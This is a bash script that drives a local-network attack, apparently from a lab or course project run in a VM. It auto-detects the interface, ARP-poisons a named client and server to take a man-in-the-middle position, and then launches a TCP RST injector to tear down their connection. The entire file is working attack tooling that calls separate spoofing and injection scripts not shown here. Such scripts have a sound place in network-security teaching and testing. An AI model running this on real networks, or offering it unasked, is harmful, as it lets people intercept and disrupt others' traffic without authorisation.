#!/usr/bin/env bash
# run_attack.sh — Phase 2 (physical) one-shot attack driver for the Linux VM.
#
# Reuses the Phase 1 attacker code UNCHANGED (../../attacker/arp_spoof.py and
# rst_attack.py); only the IPs and interface differ on a physical LAN. It:
#   1) auto-detects the LAN interface that reaches the server (override with -i),
#   2) ARP-poisons client<->server in the background (IP forwarding on => MITM,
#      not a black-hole DoS), waits for it to settle,
#   3) runs the RST injector in the foreground.
# Ctrl+C stops the injector, then restores the victims' ARP caches.
#
# Usage:
#   sudo ./run_attack.sh --server 192.168.1.10 --client 192.168.1.20 [-i wlan0] \
#        [--port 9000] [-- <extra rst_attack.py flags, e.g. --no-server>]
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
ARP_PY="$REPO_ROOT/attacker/arp_spoof.py"
RST_PY="$REPO_ROOT/attacker/rst_attack.py"

SERVER=""; CLIENT=""; IFACE=""; PORT="9000"; EXTRA=()
while [ $# -gt 0 ]; do
    case "$1" in
        --server) SERVER="$2"; shift 2;;
        --client) CLIENT="$2"; shift 2;;
        -i|--iface) IFACE="$2"; shift 2;;
        --port) PORT="$2"; shift 2;;
        --) shift; EXTRA=("$@"); break;;
        *) EXTRA+=("$1"); shift;;
    esac
done

[ -f "$ARP_PY" ] && [ -f "$RST_PY" ] || { echo "[attack] FATAL: attacker scripts not found under $REPO_ROOT/attacker (copy the whole repo into the VM)"; exit 1; }
[ -n "$SERVER" ] && [ -n "$CLIENT" ] || { echo "usage: sudo $0 --server <ip> --client <ip> [-i iface] [--port 9000] [-- <rst flags>]"; exit 1; }
[ "$(id -u)" -eq 0 ] || { echo "[attack] run as root: sudo $0 ..."; exit 1; }

# Auto-detect the interface that reaches the server, if not given.
if [ -z "$IFACE" ]; then
    IFACE="$(ip -o route get "$SERVER" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')"
    [ -n "$IFACE" ] || { echo "[attack] could not auto-detect interface to $SERVER; pass -i <iface>"; exit 1; }
    echo "[attack] auto-detected interface: $IFACE"
fi

echo "[attack] server=$SERVER client=$CLIENT port=$PORT iface=$IFACE extra=${EXTRA[*]:-<none>}"

ARP_PID=""
cleanup() {
    echo "[attack] cleaning up (restoring ARP) ..."
    [ -n "$ARP_PID" ] && kill -INT "$ARP_PID" 2>/dev/null || true
    [ -n "$ARP_PID" ] && wait "$ARP_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

echo "[attack] starting ARP poisoning (MITM) ..."
python3 "$ARP_PY" --client "$CLIENT" --server "$SERVER" -i "$IFACE" &
ARP_PID=$!

echo "[attack] waiting 4s for ARP poisoning + MITM to settle ..."
sleep 4

echo "[attack] launching RST injector ..."
if [ "${#EXTRA[@]}" -gt 0 ]; then
    python3 "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE" "${EXTRA[@]}"
else
    python3 "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE"
fi
